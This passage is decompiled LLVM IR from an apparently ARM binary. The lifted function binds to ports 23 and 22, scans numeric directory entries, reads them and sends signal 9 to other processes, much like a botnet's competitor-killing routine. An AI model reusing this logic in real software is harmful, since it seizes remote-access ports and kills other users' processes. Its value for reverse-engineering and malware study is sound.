  uselistorder label %dec_label_pc_e810, { 1, 0 }
  uselistorder label %dec_label_pc_e810.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e800.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e798, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e740, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e71c, { 1, 0 }
  uselistorder label %dec_label_pc_e6c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e624.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_e674, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_e63c, { 1, 0 }
  uselistorder label %dec_label_pc_e5f4, { 1, 0 }
}

define i32 @function_eab0(i32 %arg1) local_unnamed_addr {
dec_label_pc_eab0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-4312 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-8408 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-8428 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_eab0 = load i32, i32* @r4, align 4
  store i32 %v3_eab0, i32* %stack_var_-36, align 4
  %v6_eab0 = load i32, i32* @r5, align 4
  %v9_eab0 = load i32, i32* @r6, align 4
  %v12_eab0 = load i32, i32* @r7, align 4
  %v15_eab0 = load i32, i32* @r8, align 4
  %v18_eab0 = load i32, i32* @sb, align 4
  %v21_eab0 = load i32, i32* @sl, align 4
  %v24_eab0 = load i32, i32* @fp, align 4
  %v2_eac0 = call i32 @function_1396c(i32* null)
  store i32 %v2_eac0, i32* @r7, align 4
  %v0_eac8 = call i32 @function_136c8()
  %v7_eacc = icmp eq i32 %v0_eac8, -1
  %. = zext i1 %v7_eacc to i32
  %tmp212 = icmp slt i32 %v0_eac8, 1
  %storemerge174 = select i1 %tmp212, i32 %., i32 1
  store i32 %storemerge174, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1ecc0.97 to i32), i32* %r3.global-to-local, align 4
  %v2_eae8 = icmp eq i32 %storemerge174, 0
  store i32 %v0_eac8, i32* @global_var_1ecc0.97, align 4
  br i1 %v2_eae8, label %dec_label_pc_eb00, label %dec_label_pc_eaf4

dec_label_pc_eaf4:                                ; preds = %dec_label_pc_eccc, %dec_label_pc_ebb4, %dec_label_pc_eab0
  %v29_eafc = phi i32 [ %v3_ec58, %dec_label_pc_ebb4 ], [ %v0_eac8, %dec_label_pc_eab0 ], [ 0, %dec_label_pc_eccc ]
  %v2_eafc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_eafc, i32* @r4, align 4
  store i32 %v6_eab0, i32* @r5, align 4
  store i32 %v9_eab0, i32* @r6, align 4
  store i32 %v12_eab0, i32* @r7, align 4
  store i32 %v15_eab0, i32* @r8, align 4
  store i32 %v18_eab0, i32* @sb, align 4
  store i32 %v21_eab0, i32* @sl, align 4
  store i32 %v24_eab0, i32* @fp, align 4
  ret i32 %v29_eafc

dec_label_pc_eb00:                                ; preds = %dec_label_pc_eab0
  %v2_eb00 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v2_eb00, i32* %r1.global-to-local, align 4
  store i32 2, i32* @r6, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v1_eb18 = call i32 @function_e544(i32 5888)
  store i32 23, i32* %r3.global-to-local, align 4
  %v0_eb24 = load i32, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_eb2c = load i32, i32* @r5, align 4
  store i32 %v0_eb2c, i32* %r2.global-to-local, align 4
  %v3_eb38 = call i32 @function_13f90(i32 %v0_eb24, i32 1, i32 %v0_eb2c)
  %v7_eb3c = icmp eq i32 %v3_eb38, -1
  store i32 %v3_eb38, i32* @r4, align 4
  br i1 %v7_eb3c, label %dec_label_pc_eb64, label %dec_label_pc_eb48

dec_label_pc_eb48:                                ; preds = %dec_label_pc_eb00
  %v2_eb4c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_eb4c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_eb54 = bitcast i32* %stack_var_-72 to %sockaddr*
  %v4_eb54 = call i32 @function_13dc0(i32 %v3_eb38, %sockaddr* %v3_eb54, i32 16)
  %v0_eb58 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_eb60 = call i32 @function_13e74(i32 %v0_eb58, i32 1)
  br label %dec_label_pc_eb64

dec_label_pc_eb64:                                ; preds = %dec_label_pc_eb00, %dec_label_pc_eb48
  %v1_eb68 = call i32 @function_e544(i32 5632)
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_eb74 = load i32, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_eb7c = load i32, i32* @r5, align 4
  store i32 %v0_eb7c, i32* %r2.global-to-local, align 4
  %v3_eb88 = call i32 @function_13f90(i32 %v0_eb74, i32 1, i32 %v0_eb7c)
  %v7_eb8c = icmp eq i32 %v3_eb88, -1
  store i32 %v3_eb88, i32* @r4, align 4
  br i1 %v7_eb8c, label %dec_label_pc_ebb4, label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_eb64
  %v2_eb9c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_eb9c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_eba4 = bitcast i32* %stack_var_-72 to %sockaddr*
  %v4_eba4 = call i32 @function_13dc0(i32 %v3_eb88, %sockaddr* %v3_eba4, i32 16)
  %v0_eba8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_ebb0 = call i32 @function_13e74(i32 %v0_eba8, i32 1)
  br label %dec_label_pc_ebb4

dec_label_pc_ebb4:                                ; preds = %dec_label_pc_eb64, %dec_label_pc_eb98
  %v1_ebb8 = call i32 @function_14ac4(i32 5)
  %v1_ebc0 = call i32 @function_14140(i32 4096)
  store i32 ptrtoint (i32* @global_var_1ec24.103 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ecbc.105 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_ebc0, i32* %r2.global-to-local, align 4
  %v0_ebd0 = load i32, i32* @r5, align 4
  %v1_ebd0 = trunc i32 %v0_ebd0 to i8
  %v3_ebd0 = inttoptr i32 %v1_ebc0 to i8*
  store i8 %v1_ebd0, i8* %v3_ebd0, align 1
  %v0_ebd8 = load i32, i32* @r5, align 4
  %v1_ebd8 = load i32, i32* %r3.global-to-local, align 4
  %v2_ebd8 = inttoptr i32 %v1_ebd8 to i32*
  store i32 %v0_ebd8, i32* %v2_ebd8, align 4
  %v0_ebdc = load i32, i32* %r2.global-to-local, align 4
  %v1_ebdc = load i32, i32* %r1.global-to-local, align 4
  %v2_ebdc = inttoptr i32 %v1_ebdc to i32*
  store i32 %v0_ebdc, i32* %v2_ebdc, align 4
  %v1_ebe0 = call i32 @function_123b0(i32 6)
  %v1_ebe8 = call i32 @function_123b0(i32 7)
  %v0_ebec = load i32, i32* @r5, align 4
  store i32 %v0_ebec, i32* %r1.global-to-local, align 4
  %v2_ebf4 = inttoptr i32 %v0_ebec to i32*
  %v3_ebf4 = call i32 @function_122cc(i32 6, i32* %v2_ebf4)
  %v2_ebfc = ptrtoint i32* %stack_var_-8408 to i32
  store i32 %v2_ebfc, i32* @r8, align 4
  store i32 %v3_ebf4, i32* %r1.global-to-local, align 4
  store i32 %v2_ebfc, i32* @r0, align 4
  %v2_ec08 = bitcast i32* %stack_var_-8408 to i8*
  %v3_ec08 = call i32 @function_12d04(i8* %v2_ec08, i32 %v3_ebf4)
  %v0_ec0c = load i32, i32* @r8, align 4
  %v2_ec0c = add i32 %v0_ec0c, %v3_ec08
  store i32 %v2_ec0c, i32* @r4, align 4
  %v0_ec10 = call i32 @function_136f4()
  %v2_ec18 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_ec18, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_ec20 = trunc i32 %v0_ec10 to i8
  %v4_ec20 = call i32 @function_131d0(i8 %v3_ec20, i32 10, i32 %v2_ec18)
  store i32 %v4_ec20, i32* %r1.global-to-local, align 4
  %v0_ec28 = load i32, i32* @r4, align 4
  store i32 %v0_ec28, i32* @r0, align 4
  %v2_ec2c = inttoptr i32 %v0_ec28 to i8*
  %v3_ec2c = call i32 @function_12d04(i8* %v2_ec2c, i32 %v4_ec20)
  %v0_ec30 = load i32, i32* @r5, align 4
  store i32 %v0_ec30, i32* %r1.global-to-local, align 4
  %v0_ec34 = load i32, i32* @r4, align 4
  %v2_ec34 = add i32 %v0_ec34, %v3_ec2c
  store i32 %v2_ec34, i32* @r4, align 4
  %v2_ec3c = inttoptr i32 %v0_ec30 to i32*
  %v3_ec3c = call i32 @function_122cc(i32 7, i32* %v2_ec3c)
  store i32 %v3_ec3c, i32* %r1.global-to-local, align 4
  %v0_ec44 = load i32, i32* @r4, align 4
  store i32 %v0_ec44, i32* @r0, align 4
  %v2_ec48 = inttoptr i32 %v0_ec44 to i8*
  %v3_ec48 = call i32 @function_12d04(i8* %v2_ec48, i32 %v3_ec3c)
  %v0_ec4c = load i32, i32* @r5, align 4
  store i32 %v0_ec4c, i32* %r1.global-to-local, align 4
  store i32 %v3_ec48, i32* @r6, align 4
  %v3_ec58 = call i32 @function_137c8(i8* %v2_ec08, i32 %v0_ec4c)
  %v7_ec5c = icmp eq i32 %v3_ec58, -1
  br i1 %v7_ec5c, label %dec_label_pc_eaf4, label %dec_label_pc_ec64

dec_label_pc_ec64:                                ; preds = %dec_label_pc_ebb4
  %v1_ec64 = call i32 @function_1369c(i32 %v3_ec58)
  %v1_ec6c = call i32 @function_122f8(i32 6)
  %v1_ec74 = call i32 @function_122f8(i32 7)
  store i32 ptrtoint (i32* @global_var_1ecbc.105 to i32), i32* %r3.global-to-local, align 4
  %v2_ec80 = load i32, i32* @global_var_1ecbc.105, align 4
  store i32 %v2_ec80, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v4_ec8c = call i32 @function_13890(i8* %v2_ec08, i32 %v2_ec80, i32 4095)
  %v7_ec90 = icmp eq i32 %v4_ec8c, -1
  br i1 %v7_ec90, label %.thread5.thread, label %bb215

.thread5.thread:                                  ; preds = %dec_label_pc_ec64
  %v0_ec9c54 = load i32, i32* @r4, align 4
  %v1_ec9c55 = load i32, i32* @r6, align 4
  %v2_ec9c56 = add i32 %v1_ec9c55, %v0_ec9c54
  store i32 %v2_ec9c56, i32* %r1.global-to-local, align 4
  br label %bb216

bb215:                                            ; preds = %dec_label_pc_ec64
  %v3_ec98 = load i32, i32* @global_var_1ecbc.105, align 4
  store i32 %v3_ec98, i32* %r3.global-to-local, align 4
  %v0_ec9c = load i32, i32* @r4, align 4
  %v1_ec9c = load i32, i32* @r6, align 4
  %v2_ec9c = add i32 %v1_ec9c, %v0_ec9c
  store i32 %v2_ec9c, i32* %r1.global-to-local, align 4
  %v1_eca0 = load i32, i32* @r5, align 4
  %v2_eca0 = trunc i32 %v1_eca0 to i8
  %v5_eca0 = add i32 %v3_ec98, %v4_ec8c
  %v6_eca0 = inttoptr i32 %v5_eca0 to i8*
  store i8 %v2_eca0, i8* %v6_eca0, align 1
  %v1_eca4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb216

bb216:                                            ; preds = %.thread5.thread, %bb215
  %v1_eca4 = phi i32 [ %v2_ec9c56, %.thread5.thread ], [ %v1_eca4.pre, %bb215 ]
  %v0_eca4 = load i32, i32* @r8, align 4
  %v2_eca4 = sub i32 %v1_eca4, %v0_eca4
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  %v2_ecac = call i32 @function_12d7c(i32 %v2_ebfc, i32 %v2_eca4)
  %v2_ecb8 = ptrtoint i32* %stack_var_-4312 to i32
  store i32 %v2_ecb8, i32* %r1.global-to-local, align 4
  store i32 %v2_ecb8, i32* %stack_var_-8428, align 4
  %v0_ecc0 = load i32, i32* @r5, align 4
  %v0_ecc4 = load i32, i32* @r7, align 4
  store i32 %v0_ecc4, i32* @r4, align 4
  store i32 400, i32* @r5, align 4
  %v2_edc0 = ptrtoint i32* %stack_var_-152 to i32
  %v2_edc4 = bitcast i32* %stack_var_-152 to i8*
  %v2_ee10 = ptrtoint i32* %stack_var_-216 to i32
  %v2_ee14 = bitcast i32* %stack_var_-216 to i8*
  %v2_ef84 = ptrtoint i32* %stack_var_-44 to i32
  %v2_ef94 = ptrtoint i32* %stack_var_-48 to i32
  %v2_efa8 = ptrtoint i32* %stack_var_-52 to i32
  %v2_efbc = ptrtoint i32* %stack_var_-40 to i32
  %v2_efd4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ee8c = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_eccc

dec_label_pc_eccc:                                ; preds = %dec_label_pc_ed84, %bb216
  %stack_var_-8420.0 = phi i32 [ %v0_ecc0, %bb216 ], [ %stack_var_-8420.3, %dec_label_pc_ed84 ]
  %v1_ecd0 = call i32 @function_123b0(i32 6)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ecdc = call i32 @function_122cc(i32 6, i32* null)
  store i32 %v3_ecdc, i32* @r0, align 4
  %v1_ece0 = call i32 @function_13aa4(i32 %v3_ecdc)
  store i32 %v1_ece0, i32* @sl, align 4
  %v2_ece4 = icmp eq i32 %v1_ece0, 0
  br i1 %v2_ece4, label %dec_label_pc_eaf4, label %dec_label_pc_ecec

dec_label_pc_ecec:                                ; preds = %dec_label_pc_eccc
  %v1_ecf0 = call i32 @function_122f8(i32 6)
  %v0_ecf4117 = load i32, i32* @sl, align 4
  %v1_ecf8118 = inttoptr i32 %v0_ecf4117 to i32*
  %v2_ecf8119 = call i32 @function_13ba0(i32* %v1_ecf8118)
  %v2_ecfc121 = icmp eq i32 %v2_ecf8119, 0
  br i1 %v2_ecfc121, label %dec_label_pc_ed84, label %dec_label_pc_ed04.preheader

dec_label_pc_ed04.preheader:                      ; preds = %dec_label_pc_ecec, %dec_label_pc_ecf4.backedge
  %v0_ed04133 = phi i32 [ %v2_ecf8, %dec_label_pc_ecf4.backedge ], [ %v2_ecf8119, %dec_label_pc_ecec ]
  %stack_var_-8420.1122 = phi i32 [ %stack_var_-8420.1.be, %dec_label_pc_ecf4.backedge ], [ %stack_var_-8420.0, %dec_label_pc_ecec ]
  br label %dec_label_pc_ed04

dec_label_pc_ed04:                                ; preds = %dec_label_pc_ed04.preheader, %dec_label_pc_ed6c
  %v0_ed14 = phi i32 [ %v2_ed78, %dec_label_pc_ed6c ], [ %v0_ed04133, %dec_label_pc_ed04.preheader ]
  %stack_var_-8420.2 = phi i32 [ %v1_ed28, %dec_label_pc_ed6c ], [ %stack_var_-8420.1122, %dec_label_pc_ed04.preheader ]
  %v1_ed04 = add i32 %v0_ed14, 11
  %v2_ed04 = inttoptr i32 %v1_ed04 to i8*
  %v3_ed04 = load i8, i8* %v2_ed04, align 1
  %v4_ed04 = zext i8 %v3_ed04 to i32
  %v1_ed08 = add nsw i32 %v4_ed04, -48
  store i32 %v1_ed08, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_ed08, 9
  br i1 %tmp, label %dec_label_pc_ecf4.backedge, label %dec_label_pc_ed14

dec_label_pc_ed14:                                ; preds = %dec_label_pc_ed04
  store i32 %v1_ed04, i32* @r6, align 4
  %v2_ed1c = call i32 @function_14884(i8* %v2_ed04)
  %v0_ed24 = load i32, i32* @r5, align 4
  %v1_ed28 = add i32 %stack_var_-8420.2, 1
  store i32 %v1_ed28, i32* %r2.global-to-local, align 4
  store i32 %v2_ed1c, i32* @r7, align 4
  %v5_ed34 = icmp slt i32 %v0_ed24, %v2_ed1c
  %v2_ed94 = call i32 @function_1396c(i32* null)
  br i1 %v5_ed34, label %dec_label_pc_ed90, label %dec_label_pc_ed38

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed14
  %v0_ed40 = load i32, i32* @r4, align 4
  %v2_ed40 = sub i32 %v2_ed94, %v0_ed40
  %v7_ed48 = icmp slt i32 %v2_ed40, 601
  br i1 %v7_ed48, label %dec_label_pc_ed50, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_ed38
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_ecf4.backedge

dec_label_pc_ed50:                                ; preds = %dec_label_pc_ed38
  %v0_ed50 = load i32, i32* @r7, align 4
  %v7_ed54 = icmp slt i32 %v0_ed50, 401
  br i1 %v7_ed54, label %dec_label_pc_ecf4.backedge, label %dec_label_pc_ed58

dec_label_pc_ed58:                                ; preds = %dec_label_pc_ed50
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_ed60 = call i32 @function_133f8(i32 %v1_ed28, i32 10)
  %v2_ed64 = icmp eq i32 %v2_ed60, 0
  br i1 %v2_ed64, label %dec_label_pc_ed6c, label %dec_label_pc_ecf4.backedge

dec_label_pc_ed6c:                                ; preds = %dec_label_pc_ed58
  %v1_ed70 = call i32 @function_14ac4(i32 1)
  %v0_ed74 = load i32, i32* @sl, align 4
  %v1_ed78 = inttoptr i32 %v0_ed74 to i32*
  %v2_ed78 = call i32 @function_13ba0(i32* %v1_ed78)
  %v2_ed7c = icmp eq i32 %v2_ed78, 0
  br i1 %v2_ed7c, label %dec_label_pc_ed84, label %dec_label_pc_ed04

dec_label_pc_ed84:                                ; preds = %dec_label_pc_ecf4.backedge, %dec_label_pc_ed6c, %dec_label_pc_ecec
  %stack_var_-8420.3 = phi i32 [ %stack_var_-8420.0, %dec_label_pc_ecec ], [ %v1_ed28, %dec_label_pc_ed6c ], [ %stack_var_-8420.1.be, %dec_label_pc_ecf4.backedge ]
  %v0_ed84 = load i32, i32* @sl, align 4
  %v1_ed88 = inttoptr i32 %v0_ed84 to i32*
  %v2_ed88 = call i32 @function_139f0(i32* %v1_ed88)
  br label %dec_label_pc_eccc

dec_label_pc_ed90:                                ; preds = %dec_label_pc_ed14
  %v1_eda0 = call i32 @function_123b0(i32 6)
  %v1_eda8 = call i32 @function_123b0(i32 7)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_edb4 = call i32 @function_122cc(i32 6, i32* null)
  store i32 %v3_edb4, i32* %r1.global-to-local, align 4
  store i32 %v2_edc0, i32* @r0, align 4
  %v3_edc4 = call i32 @function_12d04(i8* %v2_edc4, i32 %v3_edb4)
  store i32 %v2_edc0, i32* %r3.global-to-local, align 4
  %v2_edd0 = add i32 %v3_edc4, %v2_edc0
  store i32 %v2_edd0, i32* %r5.global-to-local, align 4
  %v0_edd4 = load i32, i32* @r6, align 4
  store i32 %v0_edd4, i32* %r1.global-to-local, align 4
  store i32 %v2_edd0, i32* @r0, align 4
  %v2_eddc = inttoptr i32 %v2_edd0 to i8*
  %v3_eddc = call i32 @function_12d04(i8* %v2_eddc, i32 %v0_edd4)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_edec = call i32 @function_122cc(i32 7, i32* null)
  store i32 %v3_edec, i32* %r1.global-to-local, align 4
  %v0_edf4 = load i32, i32* %r5.global-to-local, align 4
  %v2_edf4 = add i32 %v3_eddc, %v0_edf4
  store i32 %v2_edf4, i32* @r0, align 4
  %v2_edf8 = inttoptr i32 %v2_edf4 to i8*
  %v3_edf8 = call i32 @function_12d04(i8* %v2_edf8, i32 %v3_edec)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ee04 = call i32 @function_122cc(i32 6, i32* null)
  store i32 %v3_ee04, i32* %r1.global-to-local, align 4
  store i32 %v2_ee10, i32* @r0, align 4
  %v3_ee14 = call i32 @function_12d04(i8* %v2_ee14, i32 %v3_ee04)
  %v2_ee20 = add i32 %v3_ee14, %v2_ee10
  store i32 %v2_ee20, i32* @r5, align 4
  %v0_ee24 = load i32, i32* @r6, align 4
  store i32 %v0_ee24, i32* %r1.global-to-local, align 4
  store i32 %v2_ee20, i32* @r0, align 4
  %v2_ee2c = inttoptr i32 %v2_ee20 to i8*
  %v3_ee2c = call i32 @function_12d04(i8* %v2_ee2c, i32 %v0_ee24)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_ee2c, i32* @r4, align 4
  %v3_ee3c = call i32 @function_122cc(i32 11, i32* null)
  store i32 %v3_ee3c, i32* %r1.global-to-local, align 4
  %v0_ee44 = load i32, i32* @r5, align 4
  %v1_ee44 = load i32, i32* @r4, align 4
  %v2_ee44 = add i32 %v1_ee44, %v0_ee44
  store i32 %v2_ee44, i32* @r0, align 4
  %v2_ee48 = inttoptr i32 %v2_ee44 to i8*
  %v3_ee48 = call i32 @function_12d04(i8* %v2_ee48, i32 %v3_ee3c)
  %v1_ee50 = call i32 @function_122f8(i32 6)
  %v1_ee58 = call i32 @function_122f8(i32 7)
  store i32 4095, i32* %r2.global-to-local, align 4
  %v2_ee6c = load i32, i32* %stack_var_-8428, align 4
  store i32 %v2_ee6c, i32* %r1.global-to-local, align 4
  %v4_ee70 = call i32 @function_13890(i8* %v2_edc4, i32 %v2_ee6c, i32 4095)
  %v7_ee78 = icmp eq i32 %v4_ee70, -1
  store i32 %v4_ee70, i32* @r5, align 4
  store i32 -4276, i32* @r2, align 4
  br i1 %v7_ee78, label %dec_label_pc_ef40, label %dec_label_pc_ee88

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ed90
  store i32 %v2_ee8c, i32* %r1.global-to-local, align 4
  %v2_ee90 = add i32 %v4_ee70, %v2_ee8c
  store i32 %v2_ee90, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_ee98 = add i32 %v2_ee90, -4276
  %v5_ee98 = inttoptr i32 %v4_ee98 to i8*
  store i8 0, i8* %v5_ee98, align 1
  %v1_eea0 = call i32 @function_123b0(i32 10)
  %v0_eea4 = load i32, i32* @r4, align 4
  store i32 %v0_eea4, i32* %r1.global-to-local, align 4
  %v2_eeac = inttoptr i32 %v0_eea4 to i32*
  %v3_eeac = call i32 @function_122cc(i32 10, i32* %v2_eeac)
  %v0_eeb0 = load i32, i32* @r5, align 4
  %v1_eeb0 = add i32 %v0_eeb0, -1
  store i32 %v1_eeb0, i32* @r1, align 4
  store i32 %v3_eeac, i32* %r2.global-to-local, align 4
  %v2_eeb8 = load i32, i32* %stack_var_-8428, align 4
  %v3_eebc = inttoptr i32 %v2_eeb8 to i8*
  %v4_eebc = call i32 @function_13030(i8* %v3_eebc, i32 %v1_eeb0, i32 %v3_eeac)
  %v7_eec0 = icmp eq i32 %v4_eebc, -1
  br i1 %v7_eec0, label %dec_label_pc_eedc, label %dec_label_pc_eec8

dec_label_pc_eec8:                                ; preds = %dec_label_pc_ee88
  %v2_eec8 = load i32, i32* %stack_var_-8428, align 4
  %v1_eecc = inttoptr i32 %v2_eec8 to i8*
  %v2_eecc = call i32 @function_13998(i8* %v1_eecc)
  %v0_eed0 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_eed8 = call i32 @function_1379c(i32 %v0_eed0, i32 9)
  br label %dec_label_pc_eedc

dec_label_pc_eedc:                                ; preds = %dec_label_pc_ee88, %dec_label_pc_eec8
  %v1_eee0 = call i32 @function_122f8(i32 10)
  %v0_eee4 = call i32 @function_136f4()
  %v0_eee8 = load i32, i32* @r7, align 4
  %v9_eee8 = icmp eq i32 %v0_eee8, %v0_eee4
  br i1 %v9_eee8, label %dec_label_pc_ef14, label %dec_label_pc_eef0

dec_label_pc_eef0:                                ; preds = %dec_label_pc_eedc
  %v0_eef0 = call i32 @function_13720()
  %v0_eef4 = load i32, i32* @r7, align 4
  %v9_eef4 = icmp eq i32 %v0_eef4, %v0_eef0
  br i1 %v9_eef4, label %dec_label_pc_ef14, label %dec_label_pc_eefc

dec_label_pc_eefc:                                ; preds = %dec_label_pc_eef0
  store i32 ptrtoint (i32* @global_var_1ecbc.105 to i32), i32* %r2.global-to-local, align 4
  %v2_ef00 = load i32, i32* %stack_var_-8428, align 4
  %v2_ef04 = load i32, i32* @global_var_1ecbc.105, align 4
  store i32 %v2_ef04, i32* %r1.global-to-local, align 4
  %v2_ef08 = inttoptr i32 %v2_ef00 to i8*
  %v3_ef08 = call i32 @function_130bc(i8* %v2_ef08, i32 %v2_ef04)
  %v2_ef0c = icmp eq i32 %v3_ef08, 0
  br i1 %v2_ef0c, label %dec_label_pc_ef20, label %dec_label_pc_eefc.dec_label_pc_ef14_crit_edge

dec_label_pc_eefc.dec_label_pc_ef14_crit_edge:    ; preds = %dec_label_pc_eefc
  %v0_ef18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eefc.dec_label_pc_ef14_crit_edge, %dec_label_pc_eef0, %dec_label_pc_eedc
  %v0_ef18 = phi i32 [ %v0_ef18.pre, %dec_label_pc_eefc.dec_label_pc_ef14_crit_edge ], [ %v0_eef0, %dec_label_pc_eef0 ], [ %v0_eee4, %dec_label_pc_eedc ]
  store i32 %v2_ed94, i32* @r4, align 4
  store i32 %v0_ef18, i32* @r5, align 4
  br label %dec_label_pc_ecf4.backedge

dec_label_pc_ecf4.backedge:                       ; preds = %dec_label_pc_ed58, %dec_label_pc_ed50, %dec_label_pc_ed04, %dec_label_pc_ef14, %dec_label_pc_f1c4, %.thread11
  %stack_var_-8420.1.be = phi i32 [ %v1_ed28, %dec_label_pc_f1c4 ], [ %v1_ed28, %dec_label_pc_ef14 ], [ %v1_ed28, %.thread11 ], [ %stack_var_-8420.2, %dec_label_pc_ed04 ], [ %v1_ed28, %dec_label_pc_ed50 ], [ %v1_ed28, %dec_label_pc_ed58 ]
  %v0_ecf4 = load i32, i32* @sl, align 4
  %v1_ecf8 = inttoptr i32 %v0_ecf4 to i32*
  %v2_ecf8 = call i32 @function_13ba0(i32* %v1_ecf8)
  %v2_ecfc = icmp eq i32 %v2_ecf8, 0
  br i1 %v2_ecfc, label %dec_label_pc_ed84, label %dec_label_pc_ed04.preheader

dec_label_pc_ef20:                                ; preds = %dec_label_pc_eefc
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_ef24 = load i32, i32* %stack_var_-8428, align 4
  %v2_ef28 = inttoptr i32 %v2_ef24 to i8*
  %v3_ef28 = call i32 @function_137c8(i8* %v2_ef28, i32 0)
  %v7_ef2c = icmp eq i32 %v3_ef28, -1
  store i32 %v3_ef28, i32* @r4, align 4
  br i1 %v7_ef2c, label %dec_label_pc_f1f8, label %dec_label_pc_ef38

dec_label_pc_ef38:                                ; preds = %dec_label_pc_ef20, %dec_label_pc_f1f8
  %v0_ef38 = phi i32 [ %v3_ef28, %dec_label_pc_ef20 ], [ %v0_ef38.pre, %dec_label_pc_f1f8 ]
  %v1_ef3c = call i32 @function_1369c(i32 %v0_ef38)
  br label %dec_label_pc_ef40

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ed90, %dec_label_pc_ef38
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ef4c = call i32 @function_137c8(i8* %v2_edc4, i32 0)
  %v7_ef50 = icmp eq i32 %v3_ef4c, -1
  br i1 %v7_ef50, label %dec_label_pc_f1c4, label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef40
  %v1_ef60 = call i32 @function_123b0(i32 12)
  %v1_ef68 = call i32 @function_123b0(i32 13)
  %v1_ef70 = call i32 @function_123b0(i32 14)
  %v1_ef78 = call i32 @function_123b0(i32 15)
  %v1_ef80 = call i32 @function_123b0(i32 16)
  store i32 %v2_ef84, i32* %r1.global-to-local, align 4
  %v3_ef8c = call i32 @function_122cc(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v2_ef94, i32* %r1.global-to-local, align 4
  store i32 %v3_ef8c, i32* @r5, align 4
  %v3_efa0 = call i32 @function_122cc(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v2_efa8, i32* %r1.global-to-local, align 4
  store i32 %v3_efa0, i32* @r6, align 4
  %v3_efb4 = call i32 @function_122cc(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v2_efbc, i32* %r1.global-to-local, align 4
  store i32 %v3_efb4, i32* @sb, align 4
  %v3_efc8 = call i32 @function_122cc(i32 15, i32* nonnull %stack_var_-40)
  store i32 %v3_efc8, i32* @fp, align 4
  store i32 %v2_efd4, i32* %r1.global-to-local, align 4
  %v3_efdc = call i32 @function_122cc(i32 16, i32* nonnull %stack_var_-56)
  store i32 %v2_ebfc, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_eff0114 = call i32 @function_13864(i32 %v3_ef4c, i32* nonnull %stack_var_-8408, i32 4096)
  %tmp217 = icmp slt i32 %v4_eff0114, 1
  br i1 %tmp217, label %dec_label_pc_f208, label %dec_label_pc_effc

dec_label_pc_effc:                                ; preds = %dec_label_pc_ef5c, %dec_label_pc_efe4.backedge
  %v0_f084105 = phi i32 [ %v4_eff0, %dec_label_pc_efe4.backedge ], [ %v4_eff0114, %dec_label_pc_ef5c ]
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v3_f000 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f000, i32* @r4, align 4
  %v5_f008 = icmp slt i32 %v0_f084105, %v3_f000
